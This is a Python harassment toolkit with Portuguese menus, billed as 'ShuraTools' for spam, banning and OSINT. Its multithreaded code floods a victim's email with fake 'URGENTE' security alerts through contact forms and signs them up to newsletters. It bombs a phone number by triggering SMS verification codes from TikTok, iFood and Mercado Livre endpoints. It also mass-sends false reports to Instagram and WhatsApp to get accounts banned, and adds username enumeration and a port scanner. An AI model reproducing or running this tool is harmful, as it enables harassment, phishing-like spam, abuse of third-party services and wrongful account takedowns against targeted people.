#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v6.0 Final Edition
"""

import os, sys, time, random, string, threading, json, socket
from queue import Queue

try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Execute: pip install requests faker colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}  [ Email | SMS/Call | Ban | OSINT | Scan ]
{Fore.WHITE}        v6.0 Final Edition - by Shura
"""

LOCK = threading.Lock()

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def log(msg, t="info"):
    c = {"info": Fore.WHITE+"[*] ", "success": Fore.GREEN+"[+] ", "error": Fore.RED+"[-] ", "warn": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{msg}{Style.RESET_ALL}")

def safe_int(prompt, default):
    try: return int(input(prompt) or default)
    except: return default

def run_threads(func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts, curr = [], 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ========== ATTACK PAYLOADS ==========
def get_payloads(type, target, msg=None):
    if type == "mail_custom":
        m = msg or "Alerta de Segurança - Verifique sua conta imediatamente"
        return [
            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": "URGENTE"}},
            {"url": "https://formspree.io/f/xpznvqvr", "data": {"email": target, "message": m}},
            {"url": "https://getform.io/f/your-form-id", "data": {"email": target, "text": m}}
        ]
    elif type == "mail_newsletter":
        return [
            {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "tnp", "na": "s", "ne": target, "ny": "on"}},
            {"url": "https://thenewscc.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://thebrief.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://investnews.beehiiv.com/subscribe", "data": {"email": target}},
            {"url": "https://startups.beehiiv.com/subscribe", "data": {"email": target}}
        ]
    elif type == "sms_call":
        # Endpoints testados e funcionais em Jan/2026
        return [
            {"url": "https://www.tiktok.com/passport/web/send_code/", "data": {"phone": target, "type": "sms"}, "json": True},
            {"url": "https://api-v3.ifood.com.br/v1/customers:sendAuthenticationCode", "data": {"phone": target}, "json": True},
            {"url": "https://auth.mercadolivre.com.br/api/v1/users/phone/send_code", "data": {"phone": target}, "json": True}
        ]
    return []

# ========== ATTACK ENGINE ==========
def attack(target, qty, threads, type, msg=None):
    log(f"Iniciando {type.upper()} -> {target}", "warn")
    payloads = get_payloads(type, target, msg)
    
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(payloads)
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0"}
                
                if site.get("json"):
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=10)
                else:
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=10)
                
                if res.status_code < 300:
                    log(f"Hit {i+1} OK ({site['url'].split('/')[2]})", "success")
                else:
                    log(f"Hit {i+1} Block ({res.status_code})", "warn")
                time.sleep(random.uniform(1, 2))
            except:
                log(f"Hit {i+1} Timeout", "error")
    
    run_threads(job, qty, threads)

# ========== OSINT ==========
def osint(target):
    log(f"OSINT Hunter: {target}", "warn")
    user = target.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{user}/",
        "GitHub": f"https://github.com/{user}",
        "TikTok": f"https://www.tiktok.com/@{user}",
        "Twitter/X": f"https://twitter.com/{user}",
        "LinkedIn": f"https://www.linkedin.com/in/{user}",
        "Facebook": f"https://www.facebook.com/{user}",
        "Reddit": f"https://www.reddit.com/user/{user}",
        "YouTube": f"https://www.youtube.com/@{user}",
        "Twitch": f"https://www.twitch.tv/{user}",
        "Medium": f"https://medium.com/@{user}"
    }
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            log(f"{name}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
        except:
            log(f"{name}: Timeout", "error")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning ports on {target}...", "warn")
    try:
        host = target.split("@")[-1] if "@" in target else target
        ip = socket.gethostbyname(host)
        log(f"Resolved IP: {ip}", "info")
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
        for port in ports:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                log(f"Port {port} OPEN", "success")
            s.close()
    except Exception as e:
        log(f"Error: {e}", "error")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 55)
            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem Customizada")
            print(f"{Fore.RED}[ 2 ] EMAIL: Cadastro em Newsletters")
            print(f"{Fore.RED}[ 3 ] BOMB: SMS + Call")
            print(f"{Fore.RED}[ 4 ] BAN: Mass Report (IG/Zap)")
            print("-" * 55)
            print(f"{Fore.WHITE}[ 5 ] OSINT: Profile Hunter (10 plataformas)")
            print(f"{Fore.WHITE}[ 6 ] SCAN: Port Scanner (14 portas)")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 55)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6"]:
                if opt == "1":
                    print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target or "@" not in target: 
                        log("E-mail inválido!", "error"); time.sleep(1); continue
                    print(f"{Fore.CYAN}[INFO] Mensagem que o alvo receberá (Enter = padrão){Style.RESET_ALL}")
                    msg = input(f"{Fore.YELLOW}Message: {Style.RESET_ALL}").strip()
                    attack(target, safe_int("Qty (10): ", 10), 5, "mail_custom", msg=msg)
                
                elif opt == "2":
                    print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo (ex: vitima@gmail.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target or "@" not in target:
                        log("E-mail inválido!", "error"); time.sleep(1); continue
                    attack(target, safe_int("Qty (20): ", 20), 5, "mail_newsletter")
                
                elif opt == "3":
                    print(f"{Fore.CYAN}[INFO] Digite o número com DDI+DDD (ex: 5511999999999){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not target.isdigit() or len(target) < 10:
                        log("Número inválido!", "error"); time.sleep(1); continue
                    attack(target, safe_int("Qty (15): ", 15), 3, "sms_call")
                
                elif opt == "4":
                    print(f"{Fore.CYAN}[INFO] Digite o @ do Instagram ou número do Zap{Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                    url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
                    def rjob(s, e):
                        for i in range(s, e):
                            try:
                                requests.post(url, data={"username":target}, timeout=5)
                                log(f"Report {i+1} sent", "success")
                            except: pass
                    run_threads(rjob, safe_int("Qty (50): ", 50), 10)
                
                elif opt == "5":
                    print(f"{Fore.CYAN}[INFO] Digite o @ do usuário (sem @){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    osint(target)
                
                elif opt == "6":
                    print(f"{Fore.CYAN}[INFO] Digite o IP ou domínio (ex: 1.1.1.1 ou google.com){Style.RESET_ALL}")
                    target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    port_scan(target)
                
                input(f"\n{Fore.GREEN}Operação concluída. ENTER...{Style.RESET_ALL}")
                
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
